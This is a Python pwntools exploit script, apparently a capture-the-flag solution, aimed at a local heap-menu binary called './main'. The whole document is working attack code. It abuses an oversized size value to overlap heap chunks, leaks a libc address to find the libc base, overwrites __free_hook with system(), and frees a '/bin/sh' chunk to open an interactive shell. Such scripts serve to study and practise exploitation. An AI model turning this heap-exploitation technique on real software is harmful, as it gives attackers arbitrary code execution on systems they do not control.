#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./main')
    elf = ELF('./main')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

def choice(c):
    p.recvuntil('>>\n')
    p.sendline(str(c))

def create(idx, sz, data):
    choice(1)
    p.recvuntil('idx?')
    p.sendline(str(idx))
    p.recvuntil('size?\n')
    p.sendline(str(sz))
    p.recvuntil('content?\n')
    p.send(data)

def delete(idx):
    choice(2)
    p.recvuntil('idx?')
    p.sendline(str(idx))

def edit(idx, sz, data):
    choice(3)
    p.recvuntil('idx?')
    p.sendline(str(idx))
    p.recvuntil('size?\n')
    p.sendline(str(sz))
    p.recvuntil('content?\n')
    p.send(data)

def show(idx):
    choice(4)
    p.recvuntil('idx?')
    p.sendline(str(idx))

# overlap chunks
for i in range(9): # 0~8
    create(i, 0x400-8, 'A')
create(9, 0x8, 'A') # 9 => padding
p.recvuntil('>>\n')
p.sendline(str(1))
p.recvuntil('idx?')
p.sendline(str(0))
p.recvuntil('size?\n')
p.sendline(str(0xffffffff))

# leak libc
for i in range(8,0,-1): # free 1~8
    delete(i)
edit(0, 0x400, 0x400*'A')
show(0)
p.recvuntil(0x400*'A')
malloc_hook = u64(p.recv(6).ljust(8, '\x00')) - 0x70
libc_base = malloc_hook - libc.symbols['__malloc_hook']
info('libc_base = ' + hex(libc_base))
edit(0, 0x400, 0x3f8*'A'+p64(0x401)) # restore

# write __free_hook
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
edit(0, 0x800+8, 0x3f0*'A'+p64(0x400)+p64(0x401)+p64(malloc_hook+0x70)*2+0x3e0*'\x00'+p64(0x400)+p64(0x401)+p64(free_hook))
create(1, 0x400-8, 'A') # 1
create(2, 0x400-8, p64(system)) # 2

# get shell
create(3, 0x100, '/bin/sh\x00') # 3
delete(3)

#gdb.attach(p)

p.interactive()

